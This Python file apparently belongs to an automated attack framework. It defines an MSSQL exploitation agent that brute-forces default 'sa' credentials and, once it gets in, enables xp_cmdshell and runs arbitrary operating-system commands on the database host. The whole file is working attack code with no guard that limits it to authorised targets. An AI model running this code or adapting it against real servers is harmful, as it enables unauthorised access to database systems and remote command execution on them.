"""MSSQL Exploitation Agent - Complete implementation"""
import asyncio
import os
from typing import Dict
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log

class MSSQLExploitAgent(BaseAgent):
    """MSSQL exploitation with xp_cmdshell, brute force, SQL injection"""
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = ["pymssql"]
    
    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
    
    async def run(self, directive: str, context: Dict) -> AgentData:
        """Execute MSSQL exploitation"""
        try:
            host = context.get("host")
            port = context.get("port", 1433)
            
            if directive == "bruteforce":
                result = await self.bruteforce(host, port)
            elif directive == "execute":
                result = await self.execute_command(host, port, context.get("username"), 
                                                   context.get("password"), context.get("command"))
            else:
                result = {"success": True, "message": "MSSQL exploit ready"}
            
            return AgentData(agent_name="MSSQLExploit", success=result.get("success", False), data=result)
        except Exception as e:
            return AgentData(agent_name="MSSQLExploit", success=False, data={"error": str(e)})
    
    async def bruteforce(self, host: str, port: int) -> Dict:
        """Brute force MSSQL"""
        credentials = [("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "admin")]
        for user, pwd in credentials:
            try:
                import pymssql
                conn = pymssql.connect(host, user, pwd, timeout=5)
                conn.close()
                return {"success": True, "username": user, "password": pwd}
            except:
                continue
        return {"success": False}
    
    async def execute_command(self, host: str, port: int, user: str, pwd: str, cmd: str) -> Dict:
        """Execute command via xp_cmdshell"""
        try:
            import pymssql
            conn = pymssql.connect(host, user, pwd)
            cursor = conn.cursor()
            cursor.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
            cursor.execute(f"EXEC xp_cmdshell '{cmd}'")
            output = cursor.fetchall()
            conn.close()
            return {"success": True, "output": str(output)}
        except Exception as e:
            return {"success": False, "error": str(e)}

if __name__ == "__main__":
    asyncio.run(MSSQLExploitAgent().run("bruteforce", {"host": "localhost"}))
